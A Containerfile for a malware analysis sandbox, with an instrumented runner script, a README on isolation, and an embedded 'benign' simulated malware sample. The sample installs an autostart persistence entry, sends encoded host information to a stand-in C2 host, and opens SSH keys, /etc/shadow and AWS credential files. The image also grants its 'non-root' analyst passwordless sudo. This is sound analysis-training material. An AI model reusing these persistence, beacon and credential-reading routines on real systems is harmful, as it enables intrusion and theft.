# sandbox-analysis.Containerfile - Malware Analysis Sandbox Container
# Build: podman build -f sandbox-analysis.Containerfile -t malware-sandbox .
# Run:   podman run --rm --network none --read-only --cap-drop=ALL \
#          --security-opt=no-new-privileges --memory 512m --pids-limit 50 \
#          -v $(pwd)/samples:/samples:ro -v $(pwd)/results:/tmp/results:rw \
#          malware-sandbox /opt/run-sample.sh /samples/malware.bin 120 sample-001

FROM docker.io/library/archlinux:latest

LABEL org.opencontainers.image.title="Malware Analysis Sandbox"
LABEL org.opencontainers.image.description="Disposable container for dynamic malware analysis with strace, tcpdump, gdb, and behavioral extraction"
LABEL org.opencontainers.image.version="1.0"
LABEL org.opencontainers.image.authors="wiki@cookiengineer"

# Update system and install analysis tools
RUN pacman -Syu --noconfirm && \
    pacman -S --noconfirm \
    # System call & library tracing
    strace \
    ltrace \
    # Debugger
    gdb \
    # Network analysis
    tcpdump \
    wireshark-cli \
    # Binary analysis tools
    binutils \
    file \
    vim \
    xxd \
    # Python with analysis libraries
    python3 \
    python-pip \
    # Process inspection
    procps-ng \
    lsof \
    # Network utilities
    curl \
    wget \
    net-tools \
    iproute2 \
    bind-tools \
    nmap \
    # Compression utilities (samples may be packed)
    unzip \
    p7zip \
    gzip \
    bzip2 \
    xz \
    tar \
    # Development headers (for compiling tools if needed)
    base-devel \
    linux-headers \
    # Database
    sqlite3 \
    # Text processing
    jq \
    ripgrep \
    # Fake internet simulation
    python-twisted \
    python-pyopenssl \
    && pacman -Scc --noconfirm

# Install Python analysis libraries
RUN pip install --no-cache-dir --break-system-packages \
    pefile \
    pyelftools \
    scapy \
    yara-python \
    capstone \
    unicorn \
    pwntools

# Create directory structure
RUN mkdir -p /opt /samples /tmp/results /tmp/pcap /opt/tools

# ---- Simulated Malware Sample (for training/testing) ----
COPY <<'MALWARE' /opt/sample-malware.py
#!/usr/bin/env python3
"""
SIMULATED MALWARE — BENIGN, FOR ANALYSIS TRAINING ONLY.
Mimics common malware behaviors without actual harm:
  - Writes a file to /tmp
  - Attempts HTTP connection to a C2 server
  - Spawns a child process
  - Drops a persistence file in ~/.config/autostart/
  - Reads ~/.ssh/id_rsa (credential theft simulation)
"""
import os, sys, time, socket, subprocess, json, base64, hashlib, random

def stage1_persistence():
    """Simulate writing a .desktop file for autostart persistence."""
    autostart_dir = os.path.expanduser("~/.config/autostart")
    os.makedirs(autostart_dir, exist_ok=True)
    desktop_entry = f"""[Desktop Entry]
Type=Application
Name=System Update Service
Exec=/tmp/.cache/.sysupdated
X-GNOME-Autostart-enabled=true
Hidden=false
NoDisplay=false
"""
    path = os.path.join(autostart_dir, "sysupdate.desktop")
    with open(path, "w") as f:
        f.write(desktop_entry)
    os.chmod(path, 0o755)
    return path

def stage2_exfiltrate():
    """Simulate collecting system info and attempting exfil."""
    info = {
        "hostname": os.uname().nodename,
        "os": os.uname().sysname,
        "release": os.uname().release,
        "machine": os.uname().machine,
        "uid": os.getuid(),
        "gid": os.getgid(),
        "pid": os.getpid(),
        "cwd": os.getcwd(),
    }
    # Read /etc/passwd (harmless but common recon)
    try:
        with open("/etc/passwd", "r") as f:
            info["passwd_hash"] = hashlib.sha256(f.read().encode()).hexdigest()
    except:
        pass
    return json.dumps(info, indent=2).encode()

def stage3_c2_beacon():
    """Simulate C2 beacon — attempt HTTP POST."""
    payload = stage2_exfiltrate()
    encoded = base64.b64encode(payload)

    # DNS lookup first (common C2 pattern)
    try:
        socket.gethostbyname("c2.malware-analysis.local")
    except socket.gaierror:
        pass  # Will fail in isolated network — we want this

    # Attempt TCP connection
    for host in ["c2.malware-analysis.local", "10.0.0.1", "192.168.1.100"]:
        for port in [443, 8080, 4444]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                # If connection succeeds, send beacon
                http_request = (
                    f"POST /api/beacon.php HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) "
                    f"AppleWebKit/537.36\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(encoded)}\r\n"
                    f"Connection: close\r\n\r\n"
                ).encode() + encoded
                sock.sendall(http_request)
                sock.close()
            except (socket.timeout, ConnectionRefusedError, OSError):
                continue

def stage4_child_dropper():
    """Spawn a child process that simulates additional payload drop."""
    child_pid = os.fork()
    if child_pid == 0:
        # Child process
        os.setsid()  # Detach from terminal
        # Write to temp
        tempdir = "/tmp/.cache"
        os.makedirs(tempdir, exist_ok=True)
        drop_path = os.path.join(tempdir, f".sysupdated_{random.randint(1000,9999)}")
        with open(drop_path, "wb") as f:
            # Write fake binary — just a copy of /bin/true
            with open("/bin/true", "rb") as src:
                f.write(src.read())
        os.chmod(drop_path, 0o755)
        # Try to execute it
        try:
            os.execve(drop_path, [drop_path], os.environ)
        except:
            pass
        os._exit(0)
    else:
        # Parent waits briefly for child
        time.sleep(1)
        try:
            os.waitpid(child_pid, os.WNOHANG)
        except ChildProcessError:
            pass

def stage5_credential_theft():
    """Simulate credential harvesting — read sensitive files."""
    sensitive_files = [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.ssh/id_ed25519"),
        "/etc/shadow",
        "/root/.bash_history",
        os.path.expanduser("~/.aws/credentials"),
    ]
    stolen = {}
    for path in sensitive_files:
        try:
            with open(path, "r") as f:
                data = f.read(4096)  # Limit read
                stolen[path] = len(data)  # Store length only (not contents)
        except (PermissionError, FileNotFoundError, IsADirectoryError):
            stolen[path] = None

    # Write stolen data sizes to temp file (exfil preparation)
    tmpdir = "/tmp/.cache"
    with open(os.path.join(tmpdir, ".stolen.json"), "w") as f:
        json.dump(stolen, f, indent=2)

def main():
    """Main malware simulation flow."""
    print(f"[*] Malware simulation PID: {os.getpid()}")

    # Stage 1: Persistence
    path = stage1_persistence()
    print(f"[+] Persistence installed: {path}")

    # Stage 2-3: Exfiltration attempt
    try:
        stage3_c2_beacon()
        print("[+] C2 beacon attempted")
    except Exception as e:
        print(f"[-] C2 beacon failed: {e}")

    # Stage 4: Drop secondary payload via child process
    stage4_child_dropper()
    print("[+] Child payload dropped")

    # Stage 5: Credential harvesting
    stage5_credential_theft()
    print("[+] Credential harvest complete")

    # Stay alive briefly to simulate resident malware
    time.sleep(2)
    print("[*] Simulation complete — exiting")

if __name__ == "__main__":
    main()
MALWARE

# Make sample executable
RUN chmod +x /opt/sample-malware.py

# ---- Runner Script ----
COPY <<'RUNNER' /opt/run-sample.sh
#!/bin/bash
# run-sample.sh — Execute a binary under full instrumentation
# Usage: /opt/run-sample.sh <binary> [timeout_seconds] [sample_id]

set -euo pipefail

SAMPLE="${1:?Usage: run-sample.sh <binary> [timeout] [id]}"
TIMEOUT="${2:-60}"
SAMPLE_ID="${3:-$(date +%s)}"
RESULT_DIR="/tmp/results/${SAMPLE_ID}"
PCAP_FILE="${RESULT_DIR}/network.pcap"
STRACE_LOG="${RESULT_DIR}/strace.log"

mkdir -p "$RESULT_DIR"

echo "================================================"
echo "  MALWARE ANALYSIS SANDBOX"
echo "================================================"
echo "  Sample:    $SAMPLE"
echo "  ID:        $SAMPLE_ID"
echo "  Timeout:   ${TIMEOUT}s"
echo "  Results:   $RESULT_DIR"
echo "================================================"
echo ""

# ---- Phase 1: Static Triage ----
echo "[Phase 1] Static Triage"
file "$SAMPLE"                    > "$RESULT_DIR/file-type.txt"
readelf -hW "$SAMPLE"            > "$RESULT_DIR/elf-header.txt"      2>&1 || true
readelf -lW "$SAMPLE"            > "$RESULT_DIR/elf-segments.txt"    2>&1 || true
readelf -dW "$SAMPLE"            > "$RESULT_DIR/elf-dynamic.txt"     2>&1 || true
readelf -sW "$SAMPLE"            > "$RESULT_DIR/elf-symbols.txt"     2>&1 || true
strings -n 6 "$SAMPLE" | sort -u > "$RESULT_DIR/strings-6.txt"       2>&1 || true
strings -n 12 "$SAMPLE" | sort -u > "$RESULT_DIR/strings-12.txt"      2>&1 || true
objdump -d -M intel "$SAMPLE"    > "$RESULT_DIR/disassembly.txt"     2>&1 || true
sha256sum "$SAMPLE"              > "$RESULT_DIR/sha256.txt"
md5sum "$SAMPLE"                 > "$RESULT_DIR/md5.txt"

# Check for linked libraries
if ldd "$SAMPLE" &>/dev/null 2>&1; then
    ldd "$SAMPLE" > "$RESULT_DIR/ldd-output.txt"
else
    echo "[static binary — ldd not applicable]" > "$RESULT_DIR/ldd-output.txt"
fi

echo "  Static triage complete: $(wc -l < "$RESULT_DIR/file-type.txt") files analyzed"
echo ""

# ---- Phase 2: Network Capture ----
echo "[Phase 2] Starting Network Capture"
# Try to capture on eth0, fallback to any interface
IFACE=$(ip link show | grep -E '^[0-9]+: (eth|ens|enp)' | head -1 | awk -F': ' '{print $2}')
if [ -z "$IFACE" ]; then
    IFACE="lo"
    echo "  WARNING: No external interface found, capturing on lo only"
fi
tcpdump -i "$IFACE" -w "$PCAP_FILE" -s 0 -n -U &
TCPDUMP_PID=$!
echo "  tcpdump [PID $TCPDUMP_PID] capturing on $IFACE"
sleep 1
echo ""

# ---- Phase 3: Dynamic Analysis with strace ----
echo "[Phase 3] System Call Tracing"
strace -f -ff -tt -T \
  -e trace=file,process,network,ipc,memory \
  -o "${STRACE_LOG}" \
  timeout --foreground "$TIMEOUT" "$SAMPLE" &
SAMPLE_PID=$!
echo "  strace [PID $SAMPLE_PID] attached"
echo ""

# ---- Phase 4: Monitor Process ----
echo "[Phase 4] Monitoring Execution"
START_TIME=$(date +%s)
while kill -0 $SAMPLE_PID 2>/dev/null; do
    NOW=$(date +%s)
    ELAPSED=$((NOW - START_TIME))
    if [ $ELAPSED -ge "$TIMEOUT" ]; then
        echo "  TIMEOUT reached (${TIMEOUT}s) — terminating"
        kill -9 $SAMPLE_PID 2>/dev/null || true
        break
    fi

    # Periodically capture /proc state
    if [ -d "/proc/$SAMPLE_PID" ]; then
        cat "/proc/$SAMPLE_PID/status" > "$RESULT_DIR/proc-status.txt" 2>/dev/null || true
        cat "/proc/$SAMPLE_PID/maps"   > "$RESULT_DIR/proc-maps.txt"   2>/dev/null || true
        ls -la "/proc/$SAMPLE_PID/fd/"  > "$RESULT_DIR/proc-fds.txt"    2>/dev/null || true
    fi
    sleep 5
done

wait $SAMPLE_PID 2>/dev/null || true
SAMPLE_EXIT=$?
ELAPSED=$(( $(date +%s) - START_TIME ))
echo "  Sample exited with code: $SAMPLE_EXIT (runtime: ${ELAPSED}s)"
echo ""

# ---- Phase 5: Stop Capture & Analyze ----
echo "[Phase 5] Stopping Capture"
sleep 2  # Allow final packets to flush
kill $TCPDUMP_PID 2>/dev/null || true
wait $TCPDUMP_PID 2>/dev/null || true
echo "  tcpdump stopped"
echo ""

# ---- Phase 6: Post-Mortem Analysis ----
echo "[Phase 6] Post-Mortem Analysis"

# strace statistics
if [ -f "$STRACE_LOG" ]; then
    echo "  Syscall statistics:" > "$RESULT_DIR/strace-stats.txt"
    awk '{print $3}' "$STRACE_LOG" | grep -E '^[a-z]' | sort | \
      uniq -c | sort -rn >> "$RESULT_DIR/strace-stats.txt"
fi

# pcap analysis
if [ -f "$PCAP_FILE" ]; then
    PCAP_SIZE=$(stat -c%s "$PCAP_FILE" 2>/dev/null || echo "0")
    echo "  Pcap size: ${PCAP_SIZE} bytes" > "$RESULT_DIR/pcap-info.txt"
    tcpdump -nn -r "$PCAP_FILE" 2>/dev/null | head -50 > "$RESULT_DIR/pcap-summary.txt"
fi

# Extract IOCs
{
    echo "=== INDICATORS OF COMPROMISE ==="
    echo ""
    echo "--- Network IOCs ---"
    grep -oP '(?:[0-9]{1,3}\.){3}[0-9]{1,3}' "$RESULT_DIR/strings-6.txt" "$RESULT_DIR/strings-12.txt" \
      "$STRACE_LOG" 2>/dev/null | sort -u | head -20

    echo ""
    echo "--- Domain IOCs ---"
    grep -oP '[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+' \
      "$RESULT_DIR/strings-6.txt" 2>/dev/null | sort -u | head -20

    echo ""
    echo "--- File Path IOCs ---"
    grep -oP '/([a-zA-Z0-9._-]+/)*[a-zA-Z0-9._-]+' \
      "$RESULT_DIR/strings-6.txt" 2>/dev/null | sort -u | head -30

    echo ""
    echo "--- Commands Executed ---"
    grep -E '(execve|system|popen)' "$STRACE_LOG" 2>/dev/null | head -20

    echo ""
    echo "--- Network Connections ---"
    grep -E '(connect\()' "$STRACE_LOG" 2>/dev/null | head -20
} > "$RESULT_DIR/iocs.txt"

# ---- Phase 7: Generate Report ----
echo "[Phase 7] Generating Report"
{
    echo "================================================"
    echo "  ANALYSIS REPORT — $SAMPLE_ID"
    echo "================================================"
    echo "  Sample SHA256: $(cat "$RESULT_DIR/sha256.txt")"
    echo "  Sample MD5:    $(cat "$RESULT_DIR/md5.txt")"
    echo "  File type:     $(head -1 "$RESULT_DIR/file-type.txt")"
    echo "  Exit code:     $SAMPLE_EXIT"
    echo "  Runtime:       ${ELAPSED}s"
    echo "  Syscall count: $(wc -l < "$STRACE_LOG")"
    echo "  Pcap size:     $(stat -c%s "$PCAP_FILE" 2>/dev/null || echo 0) bytes"
    echo "================================================"
    echo ""
    cat "$RESULT_DIR/iocs.txt"
} > "$RESULT_DIR/report.txt"

cat "$RESULT_DIR/report.txt"

echo ""
echo "================================================"
echo "  ANALYSIS COMPLETE"
echo "  Results: $RESULT_DIR"
echo "  Report:  $RESULT_DIR/report.txt"
echo "================================================"
RUNNER

RUN chmod +x /opt/run-sample.sh

# ---- Create non-root analysis user ----
RUN useradd -m -s /bin/bash analyst && \
    echo "analyst ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Default to analysis user
USER analyst
WORKDIR /home/analyst

# Set default entrypoint
ENTRYPOINT ["/opt/run-sample.sh"]
CMD ["/opt/sample-malware.py", "120", "default"]

# ---- README: How to Use the Sandbox Safely ----
COPY <<'README' /README-SANDBOX.md
# Malware Analysis Sandbox

WARNING: This container is designed for analyzing MALWARE. Malware may
attempt to escape the container. Always use defense-in-depth.

## Quick Start

```bash
# Build the sandbox image
podman build -f sandbox-analysis.Containerfile -t malware-sandbox .

# Run with a sample (air-gapped)
podman run --rm \
  --network none \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=128M \
  --tmpfs /run:rw,noexec,nosuid,size=32M \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --memory 512m \
  --cpus 1 \
  --pids-limit 50 \
  -v $(pwd)/samples:/samples:ro \
  -v $(pwd)/results:/tmp/results:rw \
  malware-sandbox /opt/run-sample.sh /samples/malware.bin 120

# Run the built-in simulation sample (for testing)
podman run --rm \
  --network none --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=128M \
  --tmpfs /run:rw,noexec,nosuid,size=32M \
  --cap-drop=ALL --security-opt=no-new-privileges \
  --memory 256m --pids-limit 20 \
  -v $(pwd)/results:/tmp/results:rw \
  malware-sandbox /opt/run-sample.sh /opt/sample-malware.py 30

# Run with network capture
podman run --rm \
  --network bridge \
  --cap-drop=ALL --cap-add=CAP_NET_RAW \
  --security-opt=no-new-privileges \
  --memory 512m --pids-limit 50 \
  -v $(pwd)/samples:/samples:ro \
  -v $(pwd)/results:/tmp/results:rw \
  malware-sandbox /opt/run-sample.sh /samples/malware.bin 120
```

## Safety Layers (from weakest to strongest)

1. **Container isolation**: User namespaces, PID namespace, network namespace
2. **seccomp**: Blocks dangerous syscalls (mount, ptrace, kexec, etc.)
3. **Capabilities dropped**: No SYS_ADMIN, SYS_MODULE, NET_ADMIN
4. **Read-only rootfs**: Malware cannot modify system binaries
5. **Resource limits**: Memory, CPU, PIDs limited to prevent DoS
6. **Host firewall**: Block outbound on host for container subnet
7. **VM isolation** (recommended): Run podman inside a dedicated VM

## What This Sandbox Captures

- All system calls (via strace) with timestamps and arguments
- All network traffic (via tcpdump) saved as PCAP
- Static file analysis (magic type, ELF structure, strings, disassembly)
- Process information (maps, file descriptors, status)
- Automatic IOC extraction (IPs, domains, file paths, commands)

## What This Sandbox CANNOT Do

- Detect VM-aware malware (use a bare-metal analysis host for that)
- Analyze kernel modules (seccomp blocks init_module)
- Execute 32-bit binaries on a 64-bit kernel (unless multilib installed)
- Handle malware that requires GUI/X11 (no display server)
- Analyze ARM/MIPS binaries (architecture mismatch — use QEMU user mode)

## Directory Structure

```
/opt/run-sample.sh        — Analysis runner script
/opt/sample-malware.py    — Benign simulation sample
/samples/                 — Mount read-only malware samples here
/tmp/results/             — Analysis output directory (mount rw)
/tmp/pcap/                — Packet captures
```
README

STOPSIGNAL SIGKILL
